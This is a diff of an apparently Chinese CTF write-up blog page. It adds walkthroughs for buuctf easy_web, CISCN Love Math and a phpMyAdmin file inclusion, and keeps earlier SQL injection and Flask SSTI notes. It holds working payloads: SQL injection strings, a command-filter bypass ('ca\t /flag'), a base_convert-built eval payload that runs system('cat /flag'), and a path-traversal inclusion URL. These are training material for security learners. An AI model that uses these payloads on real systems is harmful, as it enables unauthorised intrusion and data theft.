@@ -100,7 +100,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2020-02-20</span>
-            <span class="time">06:19:58</span>
+            <span class="time">07:02:39</span>
           </span>
           
         </div>
@@ -114,7 +114,7 @@
 <pre><code class="hljs undefined"><span class="hljs-number">-1</span>'union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(select<span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>mysql.innodb_table_stats),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,'<span class="hljs-number">22</span></code></pre>
 
 <p>接下来介绍一个无列名注入<br> <code>select</code>4<code>from (select 1,2,3,4,5,6 union select * from users)a;</code><br> 会把第四列的数据拿出来,但是这题中的反引号过滤了<br>用下列方法<br><code>select b from (select 1,2,3 as b,4,5 union select * from users)a;</code><br>但我们不知道是第四列所以要提前fuzzing一下<br><code>select b from (select 1,2 as b,3,4,5 union select * from users)a;</code><br>查第三字段,最后fuzzing到3的时候查到flag</p>
-<h1 id="gbk-pdd-sql注入"><a href="#gbk-pdd-sql注入" class="headerlink" title="gbk+pdd sql注入"></a>gbk+pdd sql注入</h1><p>PDO默认是允许多句执行和模拟预编译的,在参数可控的情况下，会导致堆叠注入。<br>在预编译的情况下,单引号和一些敏感字符会被转义,我们知道在gbk编码下通过%df可以绕过转义<br>pdd原理执行编译<br>Set @x=0x31<br>Prepare a from “select balabala from table1 where 1=?”<br>Execute a using @x<br>如下题</p>
+<h1 id="gbk-pdd-sql注入"><a href="#gbk-pdd-sql注入" class="headerlink" title="gbk+pdd sql注入"></a>gbk+pdd sql注入</h1><p>PDO默认是允许多句执行和模拟预编译的,在参数可控的情况下, 会导致堆叠注入。<br>在预编译的情况下,单引号和一些敏感字符会被转义,我们知道在gbk编码下通过%df可以绕过转义<br>pdd原理执行编译<br>Set @x=0x31<br>Prepare a from “ select balabala from table1 where 1=? ”<br>Execute a using @x<br>如下题</p>
 <pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span> 
     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span><span class="hljs-params">($str)</span>
     </span>&#123;
@@ -191,6 +191,90 @@ app.config[<span class="hljs-string">'FLAG'</span>] = os.environ.pop(<span class
 /shrine/&#123;&#123; <span class="hljs-number">4</span>*<span class="hljs-number">4</span> &#125;&#125;</code></pre>
 
 <p>果然有,但是这跟之前的安恒月赛的一道题不同,这个是flag存在变量,而不是执行命令<br><code>app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)</code><br>可以看出flag存在app的变量config中的,本来直接就可以查看,但是黑名单过滤了<br>不过python还有一些内置函数，比如url_for和get_flashed_messages<br>/shrine/<br>可以查看到表示当前app的另一个词<br><img src="https://img-blog.csdnimg.cn/20200301191331235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="app"><br>可以通过数组访问<br>url_for.<strong>globals</strong>[‘current_app’].config查看flag<br><img src="https://img-blog.csdnimg.cn/20200301191457118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="flag"></p>
+<h1 id="buuctf-安洵杯-2019-easy-web"><a href="#buuctf-安洵杯-2019-easy-web" class="headerlink" title="buuctf [安洵杯 2019]easy_web"></a>buuctf [安洵杯 2019]easy_web</h1><p>进去后发现img参数 base64-&gt;base64-&gt;hex解码 发现555.jpg可能是文件包含<br>同样方式获得index.php源码</p>
+<pre><code class="hljs undefined"><span class="hljs-meta">&lt;?php</span>
+error_reporting(E_ALL || ~ E_NOTICE);
+header(<span class="hljs-string">'content-type:text/html;charset=utf-8'</span>);
+$cmd = $_GET[<span class="hljs-string">'cmd'</span>];
+<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'img'</span>]) || !<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>])) 
+    header(<span class="hljs-string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);
+$file = hex2bin(base64_decode(base64_decode($_GET[<span class="hljs-string">'img'</span>])));
+
+$file = preg_replace(<span class="hljs-string">"/[^a-zA-Z0-9.]+/"</span>, <span class="hljs-string">""</span>, $file);
+<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/flag/i"</span>, $file)) &#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">"xixi～ no flag"</span>);
+&#125; <span class="hljs-keyword">else</span> &#123;
+    $txt = base64_encode(file_get_contents($file));
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="hljs-string">"'&gt;&lt;/img&gt;"</span>;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
+&#125;
+<span class="hljs-keyword">echo</span> $cmd;
+<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
+<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;
+    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"forbid ~"</span>);
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
+&#125; <span class="hljs-keyword">else</span> &#123;
+    <span class="hljs-keyword">if</span> ((string)$_POST[<span class="hljs-string">'a'</span>] !== (string)$_POST[<span class="hljs-string">'b'</span>] &amp;&amp; md5($_POST[<span class="hljs-string">'a'</span>]) === md5($_POST[<span class="hljs-string">'b'</span>])) &#123;
+        <span class="hljs-keyword">echo</span> `$cmd`;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-keyword">echo</span> (<span class="hljs-string">"md5 is funny ~"</span>);
+    &#125;
+&#125;
+
+<span class="hljs-meta">?&gt;</span>
+&lt;html&gt;
+&lt;style&gt;
+  body&#123;
+   background:url(./bj.png)  no-repeat center center;
+   background-size:cover;
+   background-attachment:fixed;
+   background-color:<span class="hljs-comment">#CCCCCC;</span>
+&#125;
+&lt;/style&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+<p>绕过正则发现读取信息用的基本都过滤了<br>这里介绍两种方法<br>sort /flag 或者ca\t /flag<br>这里产生了疑问为什么 \和\t都过滤了 还能使用<br>可能 ca\t存入的时候是ca<code>\\\\</code>t这么存入的<br>所以可以查看<br>md5 安恒月赛见过 就不阐述了</p>
+<h1 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h1><p>其实参数中也是可以写php代码的 😭<br>代码如下</p>
+<pre><code class="hljs undefined"><span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+<span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span>
+<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'c'</span>]))&#123;
+    show_source(<span class="hljs-keyword">__FILE__</span>);
+&#125;<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-comment">//例子 c=20-1</span>
+    $content = $_GET[<span class="hljs-string">'c'</span>];
+    <span class="hljs-keyword">if</span> (strlen($content) &gt;= <span class="hljs-number">80</span>) &#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">"太长了不会算"</span>);
+    &#125;
+    $blacklist = [<span class="hljs-string">' '</span>, <span class="hljs-string">'\t'</span>, <span class="hljs-string">'\r'</span>, <span class="hljs-string">'\n'</span>,<span class="hljs-string">'\''</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'`'</span>, <span class="hljs-string">'\['</span>, <span class="hljs-string">'\]'</span>];
+    <span class="hljs-keyword">foreach</span> ($blacklist <span class="hljs-keyword">as</span> $blackitem) &#123;
+        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/'</span> . $blackitem . <span class="hljs-string">'/m'</span>, $content)) &#123;
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">"请不要输入奇奇怪怪的字符"</span>);
+        &#125;
+    &#125;
+    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>
+    $whitelist = [<span class="hljs-string">'abs'</span>, <span class="hljs-string">'acos'</span>, <span class="hljs-string">'acosh'</span>, <span class="hljs-string">'asin'</span>, <span class="hljs-string">'asinh'</span>, <span class="hljs-string">'atan2'</span>, <span class="hljs-string">'atan'</span>, <span class="hljs-string">'atanh'</span>, <span class="hljs-string">'base_convert'</span>, <span class="hljs-string">'bindec'</span>, <span class="hljs-string">'ceil'</span>, <span class="hljs-string">'cos'</span>, <span class="hljs-string">'cosh'</span>, <span class="hljs-string">'decbin'</span>, <span class="hljs-string">'dechex'</span>, <span class="hljs-string">'decoct'</span>, <span class="hljs-string">'deg2rad'</span>, <span class="hljs-string">'exp'</span>, <span class="hljs-string">'expm1'</span>, <span class="hljs-string">'floor'</span>, <span class="hljs-string">'fmod'</span>, <span class="hljs-string">'getrandmax'</span>, <span class="hljs-string">'hexdec'</span>, <span class="hljs-string">'hypot'</span>, <span class="hljs-string">'is_finite'</span>, <span class="hljs-string">'is_infinite'</span>, <span class="hljs-string">'is_nan'</span>, <span class="hljs-string">'lcg_value'</span>, <span class="hljs-string">'log10'</span>, <span class="hljs-string">'log1p'</span>, <span class="hljs-string">'log'</span>, <span class="hljs-string">'max'</span>, <span class="hljs-string">'min'</span>, <span class="hljs-string">'mt_getrandmax'</span>, <span class="hljs-string">'mt_rand'</span>, <span class="hljs-string">'mt_srand'</span>, <span class="hljs-string">'octdec'</span>, <span class="hljs-string">'pi'</span>, <span class="hljs-string">'pow'</span>, <span class="hljs-string">'rad2deg'</span>, <span class="hljs-string">'rand'</span>, <span class="hljs-string">'round'</span>, <span class="hljs-string">'sin'</span>, <span class="hljs-string">'sinh'</span>, <span class="hljs-string">'sqrt'</span>, <span class="hljs-string">'srand'</span>, <span class="hljs-string">'tan'</span>, <span class="hljs-string">'tanh'</span>];
+    preg_match_all(<span class="hljs-string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  
+    <span class="hljs-keyword">foreach</span> ($used_funcs[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> $func) &#123;
+        <span class="hljs-keyword">if</span> (!in_array($func, $whitelist)) &#123;
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">"请不要输入奇奇怪怪的函数"</span>);
+        &#125;
+    &#125;
+    <span class="hljs-comment">//帮你算出答案</span>
+    <span class="hljs-keyword">eval</span>(<span class="hljs-string">'echo '</span>.$content.<span class="hljs-string">';'</span>);
+&#125;</code></pre>
+
+<p>代码就是c的参数中要有白名单中的命令,但这些都是数字函数<br>candir() 函数：返回指定目录中的文件和目录的数组。<br>base_convert() 函数：在任意进制之间转换数字。<br>dechex() 函数：把十进制转换为十六进制。<br>hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。<br>var_dump() ：函数用于输出变量的相关信息。<br>readfile() 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。<br>语法：readfile(filename,include_path,context)<br>动态函数<br>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数例如：$function = “sayHello”;$function();<br>base_convert()是关键<br><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat%20/flag</code></p>
+<pre><code class="hljs undefined">base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>) =&gt; <span class="hljs-string">"hex2bin"</span>
+dechex(<span class="hljs-number">1598506324</span>) =&gt; <span class="hljs-string">"5f474554"</span>
+<span class="hljs-meta"><span class="hljs-meta-keyword">$pi</span>=hex2bin("5f474554") =&gt; $pi="_GET"   //hex2bin将一串16进制数转换为二进制字符串</span>
+(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>)&#123;<span class="hljs-built-in">pi</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>)&#123;<span class="hljs-built-in">abs</span>&#125;) =&gt; (<span class="hljs-symbol">$</span>_GET)&#123;<span class="hljs-built-in">pi</span>&#125;(<span class="hljs-symbol">$</span>_GET)&#123;<span class="hljs-built-in">abs</span>&#125;  <span class="hljs-comment">//&#123;&#125;可以代替[]</span></code></pre>
+
+<p>充分利用了执行php语句<br>过滤了[]只能用{}</p>
+<h1 id="gw-数据库"><a href="#gw-数据库" class="headerlink" title="gw 数据库"></a>gw 数据库</h1><p>phpadmin 文件包含 4.8以上版本<br><code>?target=db_datadict.php%253f/../../../../../../../../../Windows/DATE.ini</code></p>
 
         </div>
       </div>
